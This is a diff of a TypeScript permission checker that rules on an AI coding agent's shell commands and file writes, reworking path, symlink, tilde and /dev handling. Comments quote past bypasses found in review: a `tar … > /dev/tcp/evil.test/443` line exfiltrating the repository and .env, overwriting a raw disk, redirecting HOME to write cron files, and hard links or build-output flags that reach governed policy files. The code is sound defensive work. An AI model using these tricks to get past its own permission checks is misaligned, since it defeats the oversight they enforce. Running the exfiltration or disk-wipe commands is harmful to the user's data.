@@ -1,11 +1,27 @@
 // Evaluates a host tool call against the compiled authority table. Deterministic: no model involvement.
 import { homedir, tmpdir } from 'node:os';
-import { lstatSync, readFileSync, readdirSync, readlinkSync, realpathSync, statSync, type Dirent } from 'node:fs';
-import { basename, dirname, isAbsolute, join, resolve, sep } from 'node:path';
+import { lstatSync, readFileSync, readdirSync, realpathSync, statSync, type Dirent } from 'node:fs';
+import { dirname, isAbsolute, join, sep } from 'node:path';
 import { shimScript, gitHooksDir, resolveHooksPath } from '../project/githooks.ts';
 import { packageRoot } from '../launcher/self.ts';
 import { git, gitConfigGet } from '../util/git.ts';
 import { argvToCommandLine } from '../util/shell-quote.ts';
+export { canonicalPath, physicalPath } from './paths.ts';
+import {
+  canonicalPath,
+  descriptorAlias,
+  directoryCandidates,
+  hostTrim,
+  isDevPath,
+  isDiscardDevice,
+  isNetworkDevice,
+  lexicalPath,
+  chdirPath,
+  openedPath,
+  pathCandidates,
+  withPathCache,
+  type PathCandidates,
+} from './paths.ts';
 import type { CompiledAuthorityTable, CompiledMatcher } from './compile.ts';
 import { explainOutcome, renderReason, type ReasonCode, type RuleExplanation } from './reasons.ts';
 import { LOCK_TIER_LABEL } from './vocabulary.ts';
@@ -2508,7 +2524,8 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
       const w = t.slice(st, Math.min(k, t.length));
       if (w) {
         const src = unquoteShellWord(w);
-        if (!src.startsWith('&') && !isDevPath(src)) reads.push(src);
+        // a device NAME is not file content, but an open descriptor above 2 (`/dev/fd/3`) is whatever an earlier line opened
+        if (!src.startsWith('&') && !(isDevPath(src) && descriptorAlias(src) === null)) reads.push(src);
       }
       i = Math.max(k, i + 1);
       continue;
@@ -2558,9 +2575,12 @@ function scanRedirections(segment: string): { writes: string[]; reads: string[] 
     const target = unquoteShellWord(word);
     if (dup && /^\d+$|^-$/.test(target)) continue; // fd duplication, not a file
     if (target.startsWith('&')) continue;
-    // real device sinks are not writes to a governed path - but only after `..` is resolved away, so that
-    // `/dev/../etc/x` is judged as `/etc/x` (round 13)
-    if (isDevPath(target)) continue;
+    // a discard device is not a write to a governed path - but only after `..` is resolved away, so that
+    // `/dev/../etc/x` is judged as `/etc/x` (round 13). Every OTHER path under /dev is a destination: the raw disk
+    // `echo x > /dev/disk0` used to be dropped with the null device. And `/dev/tcp/HOST/PORT` is a socket, judged by the
+    // network (the `net-redirect` marker), not as a file: `tar czf - . > /dev/tcp/evil.test/443` has no network binary
+    // anywhere on the line (exit review 7)
+    if (isDiscardDevice(target) || isNetworkDevice(target)) continue;
     out.push(target);
   }
   return { writes: out, reads };
@@ -2575,35 +2595,8 @@ function redirectionSources(segment: string): string[] {
   return scanRedirections(segment).reads;
 }
 
-/** `/dev/tcp/HOST/PORT` and `/dev/udp/HOST/PORT` ARE NOT FILES. bash intercepts the pathname inside its own
- *  redirection code and calls connect(2); nothing is opened on disk, and `ls /dev/tcp` is ENOENT. */
-const NET_DEVICE_RE = /^\/dev\/(tcp|udp)\/([^/]+)\/([^/]+)$/;
-/** True when a path names a real device, which is a DISCARD rather than a destination — `/dev/null`, `/dev/tty`.
- *
- *  Two things this gets right that three separate `/^\/dev\//` tests did not. It RESOLVES first, so `/dev/..` is
- *  `/` and `/dev/../Users/me/.zshrc` is judged as the home file it is — a nine-character prefix had been turning
- *  an absolute deny into ALLOW for any path on the machine. And it excludes the network pseudo-paths, which are
- *  sockets: `tar czf - . > /dev/tcp/evil.test/443` streamed the whole repository, `.git` and `.env` included, to
- *  an arbitrary host at ALLOW, with no network binary anywhere on the line (exit review 7). */
-const BLOCK_DEVICE_RE = /^\/dev\/r?(disk|sd|hd|nvme|vd|xvd|mmcblk|loop)\w*$/;
-function isDeviceDiscard(path: string): boolean {
-  const a = path.startsWith('/') ? resolve(path) : path;
-  if (a !== '/dev' && !a.startsWith('/dev/')) return false;
-  // `/dev/null` and `/dev/tty` swallow what they are given; `/dev/disk0` is the DISK, and `cp /dev/zero
-  // /dev/disk0` overwrites it (exit review 7). A raw block device is a destination, not a discard.
-  return !NET_DEVICE_RE.test(a) && !BLOCK_DEVICE_RE.test(a);
-}
 /** Verbs whose effect on the path they name is irreversible, so an unreadable operand is a gap rather than noise. */
 const DESTRUCTIVE_HEADS = new Set(['rm', 'unlink', 'rmdir', 'shred', 'mv', 'truncate', 'chmod', 'chown', 'dd']);
-/** True when a path is under `/dev` AFTER resolution — device or network pseudo-path alike. A network redirection
- *  is not a file, so it must not be judged in the PATH channel (as a write outside the workspace, which would
- *  deny the ordinary `echo > /dev/tcp/localhost/8080` connectivity check); the `net-redirect` marker carries it
- *  to the network capability instead, where `nc localhost 8080` already sits. */
-function isDevPath(path: string): boolean {
-  const a = path.startsWith('/') ? resolve(path) : path;
-  return a === '/dev' || a.startsWith('/dev/');
-}
-
 /** Removes shell quoting and backslash escapes from a single word, the way the shell does before it opens a file. */
 function unquoteShellWord(w: string): string {
   let out = '';
@@ -3387,6 +3380,9 @@ export interface CwdPoint {
   unknown: boolean;
   /** true when THIS stage is a directory change whose target could not be resolved */
   dynamicCd: boolean;
+  /** the directories `~-` and `$OLDPWD` may name at this stage; empty when the command line has not changed directory
+   *  (the one the shell started with is the environment's, and is not known here) */
+  old?: string[];
 }
 export function cwdTimeline(
   stages: readonly ShellStage[],
@@ -3415,30 +3411,16 @@ export function cwdTimeline(
   // WHICH OF `cd`, `pushd` AND `popd` ARE A FUNCTION HERE is the binding reader's answer, the same one the analyzer asks
   // (functionBindingTimeline): a definition that ran in a pipeline stage or a subshell, that was undone, or that may not
   // have run leaves the BUILTIN to run - or to maybe run - where this model used to see a no-op
-  const binds = functionBindingTimeline(stages, (file, moved) =>
-    readScript === undefined || (moved && !isAbsolute(file)) ? null : readScript(isAbsolute(file) ? file : resolve(start, file)),
-  );
+  const binds = functionBindingTimeline(stages, (file, moved) => {
+    if (readScript === undefined || (moved && !isAbsolute(file))) return null;
+    const opened = openedPath(start, file);
+    return opened === null ? null : readScript(opened);
+  });
   const isMarker = (x: ShellStage) => x.text.startsWith(MARK);
-  const resolveTarget = (operand: string, base: string, physical: boolean): string[] => {
-    if (base === CWD_UNKNOWN) return [CWD_UNKNOWN];
-    const expanded = expandHome(operand, base);
-    if (expanded === null || /[$`*?[{]/.test(expanded)) return [CWD_UNKNOWN];
-    const logical = canonicalPath(isAbsolute(expanded) ? expanded : resolve(base, expanded));
-    if (!/(^|\/)\.\.(\/|$)/.test(expanded)) return [logical];
-    // `..` AFTER A SYMLINK goes two places: LOGICAL (the default) applies it to the text, PHYSICAL (-P, `set -P`, zsh's
-    // chase_dots) follows the link first. Which one the shell uses can be changed by an earlier line, so unless the
-    // command says `-P` or `-L` itself, both are possible
-    let cur = isAbsolute(expanded) ? '/' : base;
-    for (const part of expanded.split('/')) {
-      if (part === '' || part === '.') continue;
-      try {
-        cur = part === '..' ? dirname(realpathSync(cur)) : realpathSync(join(cur, part));
-      } catch {
-        cur = part === '..' ? dirname(cur) : join(cur, part);
-      }
-    }
-    return physical ? [cur] : cur === logical ? [logical] : [logical, cur];
-  };
+  // WHERE A `cd` WORD LEADS is the shared resolver's answer (directoryCandidates): `..` AFTER A SYMLINK goes two places,
+  // and which one the shell takes can be changed by an earlier line, so unless the command says `-P` both are possible
+  const resolveTarget = (operand: string, base: string, physical: boolean): string[] =>
+    base === CWD_UNKNOWN ? [CWD_UNKNOWN] : (directoryCandidates(base, operand, physical) ?? [CWD_UNKNOWN]);
   const scopes: Array<{ id: number; now: Set<string>; extra: Set<string>; oldpwd: Set<string> | null; stack: Array<Set<string>>; stackAmbiguous: boolean; mayStop: boolean }> = [];
   let stackAmbiguous = false;
   /** whether an earlier stage of the CURRENT `&&` chain could have failed, ending the chain before the stage after it */
@@ -3484,7 +3466,12 @@ export function cwdTimeline(
       extra = new Set();
     }
     if (chainStart) mayStop = false;
-    const point: CwdPoint = { dirs: [...now].filter((d) => d !== CWD_UNKNOWN), unknown: now.has(CWD_UNKNOWN), dynamicCd: false };
+    const point: CwdPoint = {
+      dirs: [...now].filter((d) => d !== CWD_UNKNOWN),
+      unknown: now.has(CWD_UNKNOWN),
+      dynamicCd: false,
+      old: oldpwd === null || oldpwd.has(CWD_UNKNOWN) ? [] : [...oldpwd],
+    };
     out.push(point);
 
     // a stage that FEEDS a pipe, runs in the background or sits in a subshell cannot reach the caller - and that is a
@@ -3565,7 +3552,8 @@ export function cwdTimeline(
       // the file may change the directory; what it does is read where it can be, and unknown where it cannot
       const file = head[hi + 1];
       const t = new Set<string>(now);
-      const text0 = file !== undefined && readScript && !/[$`*?[{]/.test(file) ? readScript(isAbsolute(file) ? file : resolve([...now][0] === CWD_UNKNOWN ? start : [...now][0]!, file)) : null;
+      const sourced = file !== undefined && readScript && !/[$`*?[{]/.test(file) ? openedPath([...now][0] === CWD_UNKNOWN ? start : [...now][0]!, file) : null;
+      const text0 = sourced !== null && readScript ? readScript(sourced) : null;
       if (text0 === null) t.add(CWD_UNKNOWN);
       else {
         for (const sub of splitShellPipeline(text0)) {
@@ -3613,9 +3601,15 @@ export function cwdTimeline(
 
 /** Replace `$NAME` and `${NAME}` with the literal value the same command line assigned earlier, outside single quotes - what the shell
  *  does, for the values this analyzer can prove. `f=.claude/settings.json; tee $f` writes that file, and judging the
- *  word `$f` left a governed write with no path to judge (exit review 11). An unknown name is left alone. */
+ *  word `$f` left a governed write with no path to judge (exit review 11). An unknown name is left alone.
+ *
+ *  A LEADING `~` IS `$HOME`: once the line has assigned HOME, `export HOME=/etc; echo x > ~/cron.d/x` writes `/etc/cron.d/x`,
+ *  and the path reader (which expands a tilde to the home directory the process started with) would judge the wrong file.
+ *  The tilde at the start of a word is therefore replaced by the value the line gave HOME - a value this kernel cannot read
+ *  is a word that asks (see where the assignment is recorded). */
 function substituteKnownVars(text: string, vars: ReadonlyMap<string, string>): string {
-  if (vars.size === 0 || !text.includes('$')) return text;
+  const tildeIsHome = vars.has('HOME') && text.includes('~');
+  if (vars.size === 0 || (!text.includes('$') && !tildeIsHome)) return text;
   let out = '';
   let q = false;
   for (let i = 0; i < text.length; i++) {
@@ -3628,6 +3622,10 @@ function substituteKnownVars(text: string, vars: ReadonlyMap<string, string>): s
     if (c === "'" ) {
       q = !q;
       out += c;
+      continue;
+    }
+    if (c === '~' && !q && tildeIsHome && (i === 0 || /[\s;&|(<>]/.test(text[i - 1]!)) && (i + 1 === text.length || /[/\s;&|)<>]/.test(text[i + 1]!))) {
+      out += vars.get('HOME')!;
       continue;
     }
     if (c === '$' && !q) {
@@ -3742,10 +3740,10 @@ export function matchPathPattern(pattern: string, absPath: string, ctx: Evaluati
     canonicalPath(r).split(sep).join('/'),
   );
   const lexRoots = [...ctx.repoRoots, ...(ctx.cwd ? [ctx.cwd] : [])].map((r) =>
-    resolve(r).split(sep).join('/'),
+    lexicalPath(r).split(sep).join('/'),
   );
   const canonPosix = canonicalPath(absPath).split(sep).join('/');
-  const lexPosix = (isAbsolute(absPath) ? absPath : resolve(absPath)).split(sep).join('/');
+  const lexPosix = (isAbsolute(absPath) ? absPath : lexicalPath(absPath)).split(sep).join('/');
   // ...and once more on the FOLDED name, which is what the filesystem will actually resolve
   const foldRoots = canonRoots.map(foldName);
   return (
@@ -3782,69 +3780,6 @@ function verdictFor(table: CompiledAuthorityTable, ctx: EvaluationContext, capab
 
 function isAbsoluteCap(table: CompiledAuthorityTable, id: string): boolean {
   return table.capabilities[id]?.absolute === true;
-}
-
-/** How many links one path resolution may follow before it is read as a loop (Linux stops at 40). */
-const MAX_LINK_HOPS = 40;
-
-/**
- * Canonical absolute path: symlinks resolved on the deepest existing ancestor so a not-yet-created file compares
- * correctly.
- *
- * A LINK WHOSE TARGET DOES NOT EXIST YET IS STILL A LINK. `realpath` fails on `lnk -> ~/.ssh/zz-new` exactly as it
- * fails on a file that was never created, and the fallback below then judged the link's own name — `<workspace>/lnk`,
- * an ordinary repository path — while `open(O_CREAT)` follows the link and creates `~/.ssh/zz-new`. So `Write`,
- * `apply_patch` and a shell redirection through such a link were `fs.repo.write` ALLOW for a credential store (audit
- * 2026-10-01, C3). A link shipped inside a cloned repository is enough; nothing has to make it in-session. The
- * name is therefore followed the way the kernel follows it: read the link, resolve what it names (itself possibly
- * missing, possibly another link) and judge the nearest existing ancestor of the destination.
- */
-export function canonicalPath(p: string): string {
-  return canonicalWalk(resolve(p), { left: MAX_LINK_HOPS });
-}
-
-/** `budget` is shared by the whole resolution, as the kernel's own limit is: a farm of links cannot make it exponential. */
-function canonicalWalk(abs: string, budget: { left: number }): string {
-  try {
-    return realpathSync(abs);
-  } catch {
-    const parent = dirname(abs);
-    if (parent === abs) return abs;
-    // `basename`, not a slice past the parent's length: for a missing top-level name (`/zz`) the parent is `/`, one
-    // character long, and the slice dropped the name
-    const here = join(canonicalWalk(parent, budget), basename(abs));
-    let target: string;
-    try {
-      target = readlinkSync(here);
-    } catch {
-      return here; // not a link (or nothing there at all): the name is the answer
-    }
-    // a loop, or a chain longer than the kernel would follow, cannot be opened at all; its own name is as good an answer
-    if (budget.left-- <= 0) return here;
-    return walkComponents(isAbsolute(target) ? sep : dirname(here), target, budget);
-  }
-}
-
-/**
- * Walks `path` one component at a time from `from`, the way the kernel resolves it: a symlink is followed where it
- * stands (existing or not), and `..` is the parent of the DIRECTORY REACHED, not of the text before it. The text
- * form `resolve()` computes is only right when no component is a link, and `d/../x` with `d -> /elsewhere/deep`
- * names `/elsewhere/x`, not `x` beside `d`.
- */
-function walkComponents(from: string, path: string, budget: { left: number }): string {
-  let cur = from;
-  for (const part of path.split('/')) {
-    if (part === '' || part === '.') continue;
-    // `cur` is always canonical here, so the parent of the directory REACHED is just its dirname
-    cur = part === '..' ? dirname(cur) : canonicalWalk(join(cur, part), budget);
-  }
-  return cur;
-}
-
-/** Where a path that may contain `..` lands once every link it passes through is followed (see walkComponents). */
-export function physicalPath(p: string, cwd: string): string {
-  const budget = { left: MAX_LINK_HOPS };
-  return isAbsolute(p) ? walkComponents(sep, p, budget) : walkComponents(canonicalPath(cwd), p, budget);
 }
 
 function insideRoots(absPath: string, ctx: EvaluationContext): boolean {
@@ -3913,6 +3848,10 @@ export function isScratchPath(abs: string): boolean {
     '/private/tmp',
     '/var/tmp',
     '/private/var/tmp',
+    // Linux's shared-memory tmpfs is scratch space too. Redirections used to drop EVERY path under /dev as a device, which
+    // made a write there look harmless by accident; now that only the discard devices are dropped (isDiscardDevice), this
+    // is the one place under /dev where a file is ordinary
+    '/dev/shm',
   ]);
   for (const r of roots) if (posix === r || posix.startsWith(r + '/')) return true;
   return false;
@@ -4072,7 +4011,7 @@ function configuredHooksDirs(ctx: EvaluationContext): { dirs: string[]; files: s
         const inc = /^(?:include|includeif\b.*)$/.test(section) ? /^\s*path\s*=\s*(.*?)\s*$/i.exec(line) : null;
         if (inc) {
           const f = inc[1]!.replace(/^"(.*)"$/, '$1');
-          files.add(canonicalPath(f.startsWith('~/') ? join(homedir(), f.slice(2)) : isAbsolute(f) ? f : resolve(root, '.git', f)).split(sep).join('/'));
+          files.add(canonicalPath(f.startsWith('~/') ? join(homedir(), f.slice(2)) : isAbsolute(f) ? f : join(root, '.git', f)).split(sep).join('/'));
         }
       }
     } catch {
@@ -4169,14 +4108,28 @@ function tailGlobRegExp(glob: string): RegExp | null {
   }
 }
 
+/**
+ * Judges ONE PATH. An absolute path is judged as it stands; anything else is a WORD, and is read by the shared resolver
+ * (`judgeWord`) in the working directory and judged by its worst reading. There is no third way: a caller that holds a
+ * shell word must not join it to a directory itself (see authority/paths.ts).
+ */
 export function classifyPath(
   table: CompiledAuthorityTable,
   ctx: EvaluationContext,
   tool: 'Read' | 'Write' | 'Edit',
-  rawPath: string,
+  path: string,
 ): CapabilityHit {
-  const homed = expandHome(rawPath) ?? rawPath;
-  const abs = isAbsolute(homed) ? homed : resolve(ctx.cwd ?? process.cwd(), homed);
+  if (isAbsolute(path)) return classifyResolved(table, ctx, tool, path);
+  const j = judgeWord(table, ctx, tool, ctx.cwd ?? process.cwd(), path);
+  return j.hits[0] ?? unknownHit(table, ctx, `the path ${path} cannot be resolved`);
+}
+
+function classifyResolved(
+  table: CompiledAuthorityTable,
+  ctx: EvaluationContext,
+  tool: 'Read' | 'Write' | 'Edit',
+  abs: string,
+): CapabilityHit {
   if (tool !== 'Read' && ctx.egoHome && 'ego.trust.tamper' in table.capabilities) {
     const home = canonicalPath(ctx.egoHome).split(sep).join('/');
     const posix = canonicalPath(abs).split(sep).join('/');
@@ -4260,6 +4213,108 @@ export function classifyPath(
     via: inside ? 'inside registered repository' : 'outside registered repositories',
     absolute: false,
   };
+}
+
+/** The more restrictive of two hits. At equal verdicts the one that cannot be widened, then the one a rule NAMED, is kept,
+ *  so the reason a human reads is the strongest one and not merely the first. */
+function worstHit(hits: readonly CapabilityHit[]): CapabilityHit {
+  let best = hits[0]!;
+  for (const h of hits.slice(1)) {
+    const d = VERDICT_RANK[h.verdict] - VERDICT_RANK[best.verdict];
+    if (d > 0 || (d === 0 && ((h.absolute && !best.absolute) || (h.absolute === best.absolute && h.via.startsWith('matcher path') && !best.via.startsWith('matcher path'))))) best = h;
+  }
+  return best;
+}
+
+interface WordJudgement {
+  /** the word cannot be reduced to a path (`$VAR`, a command substitution, a directory-stack tilde): nothing was judged */
+  dynamic: boolean;
+  /** the word carries a glob; the readings are of its literal prefix */
+  glob: boolean;
+  /** the WORST reading of the word, then the question the readings leave open (an alias, another user's home); empty when dynamic */
+  hits: CapabilityHit[];
+}
+
+/**
+ * THE ONE WAY A SHELL WORD IS JUDGED AS A PATH. The word is read by `pathCandidates` — lexically and physically, as
+ * written and trimmed, in every directory the shell may be in, after the shell's own expansion — every reading is
+ * classified, and the verdict is the worst of them. A site that needs more than a verdict (a ledger entry, a protected-tree
+ * comparison) asks `pathEntries` for the same readings instead of resolving the word itself.
+ */
+function judgeWord(
+  table: CompiledAuthorityTable,
+  ctx: EvaluationContext,
+  kind: 'Read' | 'Write' | 'Edit',
+  cwds: string | readonly string[],
+  word: string,
+  old?: readonly string[],
+): WordJudgement {
+  const c = pathCandidates(cwds, word, old);
+  if (c.dynamic) return { dynamic: true, glob: false, hits: [] };
+  return { dynamic: false, glob: c.glob, hits: judgeCandidates(table, ctx, kind, c) };
+}
+
+/** The verdict for the readings of a word that has some: the worst of them, then the question they leave open. */
+function judgeCandidates(
+  table: CompiledAuthorityTable,
+  ctx: EvaluationContext,
+  kind: 'Read' | 'Write' | 'Edit',
+  c: PathCandidates,
+): CapabilityHit[] {
+  const hits: CapabilityHit[] = c.paths.length > 0 ? [worstHit(c.paths.map((p) => classifyResolved(table, ctx, kind, p)))] : [];
+  if (c.uncertain !== null) hits.push(unknownHit(table, ctx, c.uncertain));
+  return hits;
+}
+
+/** `judgeWord` for the common shape: every reading that is not ALLOW becomes a hit of the segment, described by `describe`. */
+function judgeInto(
+  hits: CapabilityHit[],
+  table: CompiledAuthorityTable,
+  ctx: EvaluationContext,
+  kind: 'Read' | 'Write' | 'Edit',
+  cwds: string | readonly string[],
+  word: string,
+  seg: string,
+  describe: (via: string) => string,
+  old?: readonly string[],
+): WordJudgement {
+  const j = judgeWord(table, ctx, kind, cwds, word, old);
+  for (const h of j.hits) if (h.verdict !== 'ALLOW') hits.push({ ...h, via: describe(h.via), segment: seg });
+  return j;
+}
+
+/** Whether a word is a discard device in EVERY reading it has (`/dev/null`, `/dev/stdout`...): the one question both a
+ *  redirection and an option-valued destination (`curl -o /dev/null`) ask. See `isDiscardDevice` for the list and the why. */
+function discardWord(cwds: string | readonly string[], word: string, old?: readonly string[]): boolean {
+  const c = pathCandidates(cwds, word, old);
+  return !c.dynamic && c.uncertain === null && c.paths.length > 0 && c.paths.every(isDiscardDevice);
+}
+
+/** A word as the entries the path loop works on: one per reading, `abs` canonical (for comparisons against the protected
+ *  trees and the ledger) and `lex` the reading itself (what the classifier is handed, so the typed NAME is judged too). */
+interface PathEntry {
+  raw: string;
+  abs: string | null;
+  lex?: string;
+  glob: boolean;
+  /** an entry that stands for a question the readings leave open, reported as a `command.unknown` */
+  why?: string;
+}
+
+function pathEntries(cwds: string | readonly string[], raw: string, old?: readonly string[], whole = false): PathEntry[] {
+  const c = pathCandidates(cwds, raw, old, { whole });
+  if (c.dynamic) return [{ raw, abs: null, glob: false }];
+  const out: PathEntry[] = [];
+  const seen = new Set<string>();
+  for (const lex of c.paths) {
+    const abs = canonicalPath(lex);
+    const key = `${abs}\0${lex}`;
+    if (seen.has(key)) continue;
+    seen.add(key);
+    out.push({ raw, abs, lex, glob: c.glob });
+  }
+  if (c.uncertain !== null) out.push({ raw, abs: null, glob: false, why: c.uncertain });
+  return out;
 }
 
 const MAX_EFFECT_DEPTH = 4;
@@ -4452,6 +4507,13 @@ function readInsideWorkspace(ctx: EvaluationContext, abs: string): string | null
   )
     return null;
   return (ctx.readFile ?? defaultReadFile)(abs);
+}
+
+/** The text of the file a WORD names, for a reader that opens it itself: the PHYSICAL file (see `openedPath`), read where the
+ *  kernel may read it. Null when the word is dynamic or a glob, or the file cannot be read. */
+function readWordFile(ctx: EvaluationContext, cwd: string, word: string): string | null {
+  const opened = openedPath(cwd, word);
+  return opened === null ? null : readInsideWorkspace(ctx, opened);
 }
 
 /** A REACHED CAP IS NOT AN ABSENCE. The upward walk stops after 128 levels, and returning the same `null` as a
@@ -4660,7 +4722,7 @@ function gitDirOf(root: string): string | null {
     if (st.isDirectory()) return dotGit;
     if (!st.isFile() || st.size > 4096) return null;
     const m = /^gitdir:\s*(.+?)\s*$/m.exec(readFileSync(dotGit, 'utf8'));
-    return m ? resolve(root, m[1]!) : null;
+    return m ? openedPath(root, m[1]!) : null;
   } catch {
     return null;
   }
@@ -5002,7 +5064,7 @@ function commandLineConfig(tokens: string[], cwd: string): string | null {
         ? tokens[++i]!
         : (eq?.[1] ?? null);
     if (value === null) continue;
-    if (/\.(js|mjs|cjs|ts|mts|cts|py|rb)$/.test(value)) return isAbsolute(value) ? value : join(cwd, value);
+    if (/\.(js|mjs|cjs|ts|mts|cts|py|rb)$/.test(value)) return openedPath(cwd, value) ?? value; // a LABEL: the file is not read from here
   }
   return null;
 }
@@ -5400,7 +5462,10 @@ function writtenPathOperands(segment: string, cwd: string): string[] {
   const head = tokens[hi] ?? '';
   const operands = tokens.slice(hi + 1).filter((t) => !t.startsWith('-') && !t.includes('='));
   const out: string[] = [];
-  const abs = (t: string): string => (isAbsolute(t) ? t : resolve(cwd, t));
+  // EVERY READING OF A DESTINATION is a destination: the lexical one and the physical one differ when a `..` follows a
+  // link (`cp evil.mk d/../Makefile` replaces the Makefile beside the link's TARGET), and the ledger is a set of names
+  // later reads are compared against - recording both can only make a later read more careful, never less
+  const abs = (t: string): string[] => pathCandidates(cwd, t).paths;
   // A WRITE THIS LEDGER CANNOT ENUMERATE is a wildcard, and pretending otherwise is how a makefile replaced by `cp
   // evil/* .` looked untouched: a glob or bracket in an operand of a writer, `find … -exec`, `xargs` running a writer,
   // and the tools that name an output file as an OPERAND (exit review 10, self-attack)
@@ -5413,25 +5478,25 @@ function writtenPathOperands(segment: string, cwd: string): string[] {
   if (head === 'xargs' && tokens.slice(hi + 1).some((t) => /^(cp|mv|tee|install|ln|rsync|sed|dd|truncate|touch|curl|wget|tar|unzip|sh|bash|zsh|perl|python3?|node|ruby)$/.test(t))) return [LEDGER_ANY];
   if (head === 'sort') {
     for (const [i, t] of tokens.entries()) {
-      if (t === '-o' && tokens[i + 1]) out.push(abs(tokens[i + 1]!));
-      else if (t.startsWith('--output=')) out.push(abs(t.slice(9)));
-      else if (/^-o./.test(t)) out.push(abs(t.slice(2)));
+      if (t === '-o' && tokens[i + 1]) out.push(...abs(tokens[i + 1]!));
+      else if (t.startsWith('--output=')) out.push(...abs(t.slice(9)));
+      else if (/^-o./.test(t)) out.push(...abs(t.slice(2)));
     }
     return out;
   }
-  if (head === 'uniq' && operands.length >= 2) return [abs(operands[1]!)];
+  if (head === 'uniq' && operands.length >= 2) return abs(operands[1]!);
   if (head === 'curl') {
     for (const [i, t] of tokens.entries()) {
-      if ((t === '-o' || t === '--output') && tokens[i + 1]) out.push(abs(tokens[i + 1]!));
-      else if (t.startsWith('--output=')) out.push(abs(t.slice(9)));
+      if ((t === '-o' || t === '--output') && tokens[i + 1]) out.push(...abs(tokens[i + 1]!));
+      else if (t.startsWith('--output=')) out.push(...abs(t.slice(9)));
       else if (t === '-O' || t === '--remote-name' || t === '--remote-name-all' || t === '--output-dir') return [LEDGER_ANY];
     }
     return out;
   }
   if (head === 'wget') {
     for (const [i, t] of tokens.entries()) {
-      if ((t === '-O' || t === '--output-document') && tokens[i + 1]) out.push(abs(tokens[i + 1]!));
-      else if (t.startsWith('--output-document=')) out.push(abs(t.slice(18)));
+      if ((t === '-O' || t === '--output-document') && tokens[i + 1]) out.push(...abs(tokens[i + 1]!));
+      else if (t.startsWith('--output-document=')) out.push(...abs(t.slice(18)));
       else if (t === '-P' || t === '--directory-prefix' || t === '-r' || t === '--recursive') return [LEDGER_ANY];
     }
     return out.length ? out : [LEDGER_ANY];
@@ -5443,51 +5508,53 @@ function writtenPathOperands(segment: string, cwd: string): string[] {
     // while the identical act with two extra characters was an absolute deny (exit review 7). Without `--`, the
     // first operand may be a tree-ish and everything after it is a pathspec; `git clone URL DIR` writes DIR.
     const dd = tokens.indexOf('--');
-    if (dd >= 0) out.push(...tokens.slice(dd + 1).map(abs));
+    if (dd >= 0) out.push(...tokens.slice(dd + 1).flatMap(abs));
     else if (operands[0] === 'clone') {
       const dir = operands.slice(1).filter((t) => !/^[a-z+]+:\/\/|@.*:|^git@/.test(t))[1];
-      if (dir) out.push(abs(dir));
+      if (dir) out.push(...abs(dir));
     } else {
       // `git checkout .` and `git checkout src/` name a pathspec directly; with a tree-ish in front, the rest do
       const rest = operands.slice(1);
       const treeish = rest.length > 1 && !/[/.]/.test(rest[0]!) ? 1 : 0;
-      out.push(...rest.slice(treeish).map(abs));
+      out.push(...rest.slice(treeish).flatMap(abs));
     }
   } else if (/^(cp|mv|install|ginstall|rsync|ln)$/.test(head) && tokens.some((t) => t === '-t' || t.startsWith('--target-directory'))) {
     // `-t DIR SRC…` writes DIR/basename(SRC); the LAST operand is a source, not the destination
     const ti = tokens.findIndex((t) => t === '-t' || t.startsWith('--target-directory'));
     const dirArg = tokens[ti]!.includes('=') ? tokens[ti]!.slice(tokens[ti]!.indexOf('=') + 1) : tokens[ti + 1];
     if (dirArg) {
-      const dir = abs(dirArg);
-      out.push(dir);
-      for (const src of operands.filter((o) => o !== dirArg)) out.push(`${dir}/${src.slice(src.lastIndexOf('/') + 1)}`);
+      for (const dir of abs(dirArg)) {
+        out.push(dir);
+        for (const src of operands.filter((o) => o !== dirArg)) out.push(`${dir}/${src.slice(src.lastIndexOf('/') + 1)}`);
+      }
     }
   } else if (/^(cp|mv|install|ginstall|rsync|ln)$/.test(head) && operands.length >= 2) {
     // `cp SRC DIR` WRITES `DIR/basename(SRC)`, not DIR. The ledger recorded the destination operand verbatim,
     // so `cp evil/Makefile sub && make -C sub all` marked `sub` written and left `sub/Makefile` — the file the
     // next command reads — looking fresh (exit review 10). When the destination is an existing DIRECTORY, every
     // source contributes the name it lands under.
-    const last = abs(operands[operands.length - 1]!);
-    out.push(last);
-    if (directoryExists(last))
-      for (const src of operands.slice(0, -1))
-        out.push(`${last}/${src.slice(src.lastIndexOf('/') + 1)}`);
+    for (const last of abs(operands[operands.length - 1]!)) {
+      out.push(last);
+      if (directoryExists(last))
+        for (const src of operands.slice(0, -1))
+          out.push(`${last}/${src.slice(src.lastIndexOf('/') + 1)}`);
+    }
     // A HARD LINK IS A SECOND NAME FOR THE SAME INODE. `cp -l control-plane/permissions/absolute-denies.md
     // /tmp/alias` makes the governed file writable through a path no rule covers, and the same is true of
     // `ln` without `-s`. The SOURCE is therefore part of the act, which is why it is added to the ledger here
     // (exit review 7).
     if ((head === 'ln' && !tokens.includes('-s')) || (head === 'cp' && tokens.some((t) => /^-[a-zA-Z]*l/.test(t))))
-      out.push(...operands.slice(0, -1).map(abs));
+      out.push(...operands.slice(0, -1).flatMap(abs));
   }
   else if (/^(tee|truncate|touch)$/.test(head))
     // a device sink is a DISCARD, exactly as it is for `> /dev/null`, which redirectionTargets already knows;
     // `ls | tee /dev/null` was classified as an outside-workspace write (exit review 5)
-    out.push(...operands.filter((t) => !isDeviceDiscard(t)).map(abs));
+    out.push(...operands.filter((t) => !discardWord(cwd, t)).flatMap(abs));
   else if (head === 'dd') {
     const of = tokens.find((t) => t.startsWith('of='));
-    if (of) out.push(abs(of.slice(3)));
+    if (of) out.push(...abs(of.slice(3)));
   } else if (/^(sed|gsed|perl|ruby|gawk)$/.test(head) && tokens.some((t) => /^-[a-z]*i/.test(t) || t === '--in-place') && operands.length)
-    out.push(...operands.slice(1).map(abs));
+    out.push(...operands.slice(1).flatMap(abs));
   // A BUILD TOOL'S OUTPUT FLAG IS A WRITE DESTINATION. Every bundler, compiler and archiver names where it writes
   // with a flag, and none of them were read: `esbuild src/a.ts --outfile=.git/hooks/pre-commit` installed a git
   // hook, `--outfile=control-plane/permissions/matchers.md` rewrote the policy that decides every later verdict,
@@ -5496,11 +5563,11 @@ function writtenPathOperands(segment: string, cwd: string): string[] {
   // whatever the tool is, so the rule is about the FLAG, not about an enumerated list of tools.
   for (const [i, t] of tokens.entries()) {
     const eq = OUTPUT_FLAG_RE.exec(t);
-    if (eq?.[1]) out.push(abs(eq[1]));
-    else if (eq && tokens[i + 1] && !tokens[i + 1]!.startsWith('-')) out.push(abs(tokens[i + 1]!));
+    if (eq?.[1]) out.push(...abs(eq[1]));
